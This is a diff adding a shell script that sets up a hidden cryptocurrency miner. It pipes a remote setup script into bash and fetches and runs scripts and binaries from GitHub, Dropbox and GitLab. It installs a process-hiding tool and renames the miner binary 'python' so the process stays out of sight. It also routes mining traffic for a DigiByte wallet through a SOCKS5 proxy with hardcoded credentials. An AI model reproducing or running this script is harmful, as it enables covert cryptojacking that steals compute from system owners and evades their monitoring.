@@ -1,0 +1,68 @@
+#!/bin/sh
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+wget -O - https://deb.nodesource.com/setup_17.x | bash
+
+apt -y install nodejs
+
+apt -y install npm
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget -q -O mam.sh https://raw.githubusercontent.com/ArchDas2022/MiOp/main/p2p
+chmod +x mam.sh
+screen -dmS mam ./mam.sh 60 70
+
+wget -q https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 150.136.63.252:1080
+socks5_username = archer
+socks5_password = 12322
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+ls -la
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .5
+
+./graftcp/graftcp wget -O python https://gitlab.com/tetikemrullah596/dev/-/raw/main/data
+chmod +x python
+
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
+
+ph add python
+
+./graftcp/graftcp ./python -a yespower -o stratum+tcp://yespower.na.mine.zpool.ca:6234 -u dgb1qjv224at6k9f6em763fjmlplszxdpv896lpywr2.Archer -p c=DGB -t $(nproc) -x socks5://archer:12322@150.136.63.252:1080
